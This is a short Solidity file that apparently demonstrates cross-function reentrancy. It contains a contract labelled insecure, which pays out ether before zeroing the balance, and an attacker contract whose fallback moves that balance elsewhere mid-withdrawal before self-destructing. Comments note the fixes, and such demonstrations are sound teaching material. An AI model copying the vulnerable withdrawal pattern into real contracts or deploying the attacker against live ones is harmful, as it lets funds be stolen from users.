// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.5.0;

// INSECURE
contract CFRC {
    mapping(address => uint) private userBalances;

    function deposit() public payable{
        userBalances[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amount) public {
        if (userBalances[msg.sender] >= amount) {
            userBalances[to] += amount;
            userBalances[msg.sender] -= amount;
        }
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        // you can also use transfer/send instead of call to prevent attack
        msg.sender.call.value(amountToWithdraw)("");  // can execute transfer
        userBalances[msg.sender] = 0; // this line should come before withdraw call (another fix)
    }
    function balance() public view returns(uint){
        return userBalances[msg.sender];
    }
}

contract Caller{
    CFRC cfrc;
    address payable owner;
    address receiver;

    constructor(CFRC c, address r) public{
        cfrc = c;
        owner = msg.sender;
        receiver = r;
    }

    function deposit() public payable{
        cfrc.deposit.value(msg.value)();
    }

    function withdrawTwice() public payable{
        cfrc.withdrawBalance();
    }
    
    function() external payable{
        cfrc.transfer(receiver, msg.value);
        selfdestruct(owner);
    }
}
